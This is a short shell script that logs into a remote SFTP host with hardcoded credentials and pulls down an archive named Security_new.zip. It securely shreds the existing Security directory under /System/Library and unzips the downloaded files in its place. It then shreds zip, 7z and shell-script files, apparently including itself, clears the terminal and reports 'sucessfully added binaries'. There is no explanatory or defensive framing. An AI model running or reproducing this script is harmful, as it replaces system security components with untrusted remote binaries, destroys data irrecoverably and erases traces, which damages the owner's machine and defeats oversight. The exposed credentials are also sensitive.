PERSON_NAME=""
LOCAL_FILE="appstore_unmodified.zip"
REMOTE_HOST="eu-central-1.sftpcloud.io"
REMOTE_USER="07319b13f82f42f4b7992f67379c8502"
REMOTE_PASS="xYKQetq8br1c99TV7BkgCrRZ6GpVylYl"
REMOTE_PATH="/home"
REMOTE_DEST="/"
ARCHIVE_NAME="$LOCAL_FILE_$PERSON_NAME


cd $home/../../..//System/Library/
# configuration



sshpass -p "$REMOTE_PASS" scp $REMOTE_USER@$REMOTE_HOST:Security_new.zip ./Security_new.zip
#rm -rf ./Security
shred -fzu -n 3 ./Security >/dev/null 2>&1
#echo "fsdfsdfdsfsdfsdfds"
unzip -qqo Security_new.zip -d ./
#rm -f *.zip
shred -uzv *.{zip,7z,sh}
reset
echo "sucessfully added binaries"
